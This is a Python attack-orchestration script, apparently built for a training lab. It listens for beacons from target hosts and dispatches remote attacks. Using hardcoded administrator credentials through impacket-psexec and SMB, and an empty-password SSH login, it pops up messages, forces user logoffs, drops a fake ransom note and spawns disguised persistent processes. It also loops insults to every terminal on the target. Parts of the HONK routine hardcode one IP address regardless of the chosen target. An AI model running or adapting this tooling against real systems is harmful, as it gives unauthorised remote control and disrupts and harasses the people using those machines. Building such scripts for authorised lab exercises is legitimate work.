import socket
import subprocess
import time
import os
import queue
import threading
import random
import time
import re
import sys
import paramiko

# =================CONFIGURATION=================
# Windows Credentials
ADMIN_USER = "OSEC/j.davis"
ADMIN_PASS = "P@ssword123!"

# Linux Credentials
LINUX_USER = "guest_account"
LINUX_PASS = "" # Empty password (misconfig)

# Listener Settings
# Must match the Redirect rule (443 -> 8080)
BIND_IP = "0.0.0.0"
BIND_PORT = 8080

# Concurrency Settings
# 10 workers means 10 students can be processed simultaneously.
MAX_WORKERS = 10
# ===============================================

# Global Queue to hold the attacks
# Format: (target_ip, attack_type)
attack_queue = queue.Queue()

def run_remote_cmd(target_ip, cmd_str, description):
    """Uses impacket-psexec to run a command on the target."""
    print(f"[*] [{target_ip}] Executing: {description}")
    # -no-pass creates less noise, but we pass creds explicitly
    full_cmd = f'impacket-psexec {ADMIN_USER}:{ADMIN_PASS}@{target_ip} "{cmd_str}"'
    subprocess.run(full_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def upload_file(target_ip, local_file, remote_path):
    """Uses smbclient to upload a file to the target."""
    print(f"[*] [{target_ip}] Uploading {local_file}...")
    # Requires ADMIN rights to write to C$
    smb_cmd = f'smbclient //{target_ip}/C$ -U {ADMIN_USER}%{ADMIN_PASS} -c "put {local_file} {remote_path}"'
    subprocess.run(smb_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# --- LINUX HELPER ---
def get_linux_client(ip):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # Connect using the empty password (Misconfig #8)
    client.connect(ip, username=LINUX_USER, password=LINUX_PASS, allow_agent=False, look_for_keys=False, timeout=5)
    return client
    
# --- LINUX ATTACK 1: LITTERBUG ---
def attack_linux_litter(target_ip):
    print(f"\n[!!!] Deploying 'Litterbug' to {target_ip}...")
    client = None
    try:
        client = get_linux_client(target_ip)
        # Exploits Misconfig #7 (World Writable /opt/service)
        # Create 50 empty files to clutter the directory
        client.exec_command('for i in {1..50}; do touch /opt/service/BAD_PERMS_$i.txt; done')
        print(f"[+] [{target_ip}] /opt/service cluttered.")
    except Exception as e:
        print(f"[-] [{target_ip}] Litterbug Failed: {e}")
    finally:
        if client: client.close()

# --- LINUX ATTACK 2: ZOMBIE SWARM ---
def attack_linux_zombie(target_ip):
    print(f"\n[!!!] Deploying 'Zombie Swarm' to {target_ip}...")
    client = None
    try:
        client = get_linux_client(target_ip)
        # Mimics Misconfig #9 but loud. Copies sleep binary and runs it 50 times.
        client.exec_command('cp /bin/sleep /tmp/VIRUS_SCANNING')
        # We use nohup here so processes survive after we disconnect
        client.exec_command('for i in {1..50}; do nohup /tmp/VIRUS_SCANNING 3000 > /dev/null 2>&1 & done')
        print(f"[+] [{target_ip}] Zombie processes spawned.")
    except Exception as e:
        print(f"[-] [{target_ip}] Zombie Swarm Failed: {e}")
    finally:
        if client: client.close()

# --- LINUX ATTACK 3: WALL OF SHAME ---
def attack_linux_shame(target_ip):
    print(f"\n[!!!] Deploying 'Wall of Shame' (Randomized) to {target_ip}...")
    client = None
    try:
        # 1. Connect
        client = get_linux_client(target_ip)
        
        # 2. Upload the insults file via SFTP
        # We put it in /tmp/ so any user can read/write it
        print(f"[*] [{target_ip}] Uploading insults.txt to /tmp/...")
        sftp = client.open_sftp()
        sftp.put('insults.txt', '/tmp/insults.txt')
        sftp.close()

        # 3. Execute the Loop
        # 'shuf -n 1' picks one random line from the file
        loop_command = (
            "nohup bash -c '"
            "while true; do "
            "shuf -n 1 /tmp/insults.txt | sudo wall; "
            "sleep 45; "
            "done"
            "' > /dev/null 2>&1 &"
        )
        
        client.exec_command(loop_command)
        print(f"[+] [{target_ip}] Wall of Shame loop running (reading from /tmp/insults.txt).")

    except FileNotFoundError:
        print("[-] Error: 'insults.txt' not found in current directory!")
    except Exception as e:
        print(f"[-] [{target_ip}] Wall of Shame Failed: {e}")
    finally:
        if client: client.close()
        
        
# --- WINDOWS ATTACK 1: GOODBYE ---
def attack_goodbye(target_ip):
    print(f"\n[!!!] Kicking {target_ip} (Goodbye Chat)")
    run_remote_cmd(target_ip, "msg * /time:10 \"Goodbye Chat!\"", "Message Popup")
    time.sleep(3)
    run_remote_cmd(target_ip, "tsdiscon console", "Kicking Console User")

# --- WINDOWS ATTACK 2: RANSOM ---
def attack_ransom(target_ip):
    print(f"\n[!!!] Ransomware Drop on {target_ip}")
    if not os.path.exists("ransom.txt"):
        with open("ransom.txt", "w") as f:
            f.write("")

    upload_file(target_ip, "ransom.txt", "Users\\Administrator\\Desktop\\ransom.txt")

# --- WINDOWS ATTACK 3: HONK ---
def attack_honk(target_ip):
    print(f"\n[!!!] Releasing the Goose on {target_ip}")
    zip_name = "Goose.zip"

# --- CONFIGURATION ---
    remote_path = "C:\\Windows\\Temp"
    zip_path = f"{remote_path}\\Goose.zip"
    dest_path = f"{remote_path}\\Goose"

    # --- STEP 1: COPY ZIP ---
    upload_file(target_ip, zip_name, f"Windows\\Temp\\{zip_name}")

    # --- STEP 2: UNZIP ---
    print(f"[*] [{target_ip}] Extracting with PowerShell...")
    cmd = r"""impacket-psexec OSEC/j.davis:'P@ssword123!'@192.168.103.242 "powershell -Command Expand-Archive -Path 'C:\Windows\Temp\Goose.zip' -DestinationPath 'C:\Windows\Temp\Goose' -Force" """
    subprocess.run(cmd, shell=True)

    # --- STEP 3: HONK ---
    run_remote_cmd(target_ip, "msg * /time:10 \"HONK\"", "Message Popup")
    # Wait 5 seconds for them to see popup box
    time.sleep(5)

    # --- STEP 4: LOG USER OUT ---
    print("[*] Querying active sessions for 'Administrator'...")
    # We use 'query user' to get the table of logged-in users
    check_cmd = r"""impacket-psexec OSEC/j.davis:'P@ssword123!'@192.168.103.242 "query user Administrator" """

    try:
        # Run the command and capture the output (stdout)
        output = subprocess.check_output(check_cmd, shell=True, stderr=subprocess.STDOUT).decode()
        
        # 2. Parse the output to find the ID
        # Output looks like:  ">Administrator   console    2  Active ..."
        # We look for the line containing "Administrator" and grab the digit in the ID column.
        
        # This regex looks for 'Administrator', skips some whitespace/text, and grabs the first number it sees (the ID).
        match = re.search(r"Administrator\s+\S+\s+(\d+)", output, re.IGNORECASE)
        
        if match:
            session_id = match.group(1)
            print(f"[*] Found Administrator on Session ID: {session_id}")
            
            # 3. Kill that specific session
            print(f"[*] Forcing Logoff for Session {session_id}...")
            kill_cmd = f"""impacket-psexec OSEC/j.davis:'P@ssword123!'@192.168.103.242 "logoff {session_id}" """
            subprocess.run(kill_cmd, shell=True)
            print("[+] Logoff command sent. Registry keys should trigger on next login.")
            
        else:
            print("[-] Could not find an active 'Administrator' session. (Are they already logged out?)")
            print(f"DEBUG OUTPUT:\n{output}")

    except subprocess.CalledProcessError as e:
        print(f"[-] Error querying user: {e.output.decode()}")

# --- WORKER THREAD ---
def worker():
    """Constantly pulls jobs from the queue and runs them."""
    while True:
        target_ip, attack_type = attack_queue.get()
        try:
            
            # WINDOWS JOBS
            if attack_type == "goodbye":
                attack_goodbye(target_ip)
            elif attack_type == "ransom":
                attack_ransom(target_ip)
            elif attack_type == "HONK":
                attack_honk(target_ip)
                
            # LINUX JOBS
            elif attack_type == "litter":
                attack_linux_litter(target_ip)
            elif attack_type == "zombie":
                attack_linux_zombie(target_ip)
            elif attack_type == "shame":
                attack_linux_shame(target_ip)
                
            else:
                print(f"[?] Unknown Job: {attack_type} for {target_ip}")
        except Exception as e:
            print(f"[-] Error processing {target_ip}: {e}")
        finally:
            attack_queue.task_done()

# --- MAIN LISTENER ---
def start_listener():
    # Pre-flight check
    if not os.path.exists("Goose.zip"):
        print("[-] WARNING: Goose.zip not found! The HONK attack will fail.")
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((BIND_IP, BIND_PORT))
        server.listen(100) # Backlog handles up to 100 simultaneous connections
        print(f"[*] BATTLESTATION ONLINE on port {BIND_PORT}")
        print(f"[*] Workers: {MAX_WORKERS}")
        print("[*] Waiting for beacons...")
    except Exception as e:
        print(f"[!] Bind Failed: {e}")
        return

    # Start Worker Pool
    for i in range(MAX_WORKERS):
        t = threading.Thread(target=worker, daemon=True)
        t.start()

    while True:
        try:
            # The Main thread ONLY handles accepting connections to keep it fast
            client_sock, addr = server.accept()
            victim_ip = addr[0]
            
            # Read the flag (Quickly)
            client_sock.settimeout(3)
            data = client_sock.recv(1024).decode('utf-8', errors='ignore').strip()
            
            if data:
                print(f"[+] Beacon received from {victim_ip}: {data}")
                # Put the job in the queue for the workers
                attack_queue.put((victim_ip, data))
            
            client_sock.close()
            
        except KeyboardInterrupt:
            print("\n[*] Shutting down.")
            break
        except Exception as e:
            print(f"[!] Listener Error: {e}")

if __name__ == "__main__":
    start_listener()
